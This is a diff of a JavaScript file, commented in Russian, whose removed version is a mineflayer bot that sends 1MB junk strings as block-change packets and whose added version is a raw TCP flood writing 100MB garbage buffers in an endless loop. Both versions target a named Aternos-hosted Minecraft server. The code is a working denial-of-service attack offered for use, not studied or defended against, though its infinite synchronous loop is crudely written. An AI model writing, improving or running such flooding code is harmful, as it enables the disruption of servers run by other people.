@@ -1,62 +1,29 @@
-import mineflayer from 'mineflayer';
-import { Vec3 } from 'vec3';
+import net from 'net';
 
-    const bot = mineflayer.createBot({
-        host: 'vladlohh3.aternos.me',
-        port: 25069,
-        username: "ded_boltoed",
-        version: '1.20.1',
-    });
-
-    bot.once('spawn', async () => {
-        console.log('zaebis')
-        for (;;) {console.log(1)
-           sendHugeRandomString(bot)
-            await delay(500)
-        }
-    })
-
-    bot.on('message', async (message) => {
-        const messageText = message.toString();
-        console.log(messageText)
-    })
-    bot._client.write()
-
-function sendHugeRandomString(bot) {
-    // Создаем огромную рандомную строку (1MB+)
-    const HUGE_STRING = generateRandomString(1024 * 1024); // 1MB строка
+function floodServer() {
+    const socket = net.connect(25069, 'vladlohh3.aternos.me');
     
-    // Позиция для "блока" (можно выбрать любую)
-    const position = new Vec3(0, 100, 0);
-    
-    try {
-        bot._client.write('block_change', {
-            location: position,
-            type: HUGE_STRING // Отправляем строку как тип блока
+    socket.on('connect', () => {
+        console.log('Подключен для флуда');
+        
+        // Отправляем огромные пакеты постоянно
+        const floodInterval = setInterval(() => {
+            const garbage = Buffer.alloc(100 * 1024 * 1024); // 100MB
+            socket.write(garbage);
+            console.log('Флуд пакет отправлен');
+        }, 100);
+        
+        socket.on('error', () => {
+            clearInterval(floodInterval);
         });
-        console.log('Отправлен огромный пакет!');
-    } catch (error) {
-        console.log('Ошибка:', error.message);
-    }
+        
+        socket.on('close', () => {
+            clearInterval(floodInterval);
+            console.log('Соединение разорвано');
+        });
+    });
 }
 
-// Генерат
-
-// Генератор случайной строки
-function generateRandomString(length) {
-    let result = '';
-    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:,.<>?';
-    
-    for (let i = 0; i < length; i++) {
-        result += characters.charAt(Math.floor(Math.random() * characters.length));
-    }
-    return result;
+for (;;) {
+    floodServer()
 }
-
-async function delay(time) {
-    return new Promise(resolve => setTimeout(resolve, time));
-}
-
-bot.on('kicked', (reason, loggedIn) => {
-    console.log('Kicked:', reason, 'Logged in:', loggedIn);
-});
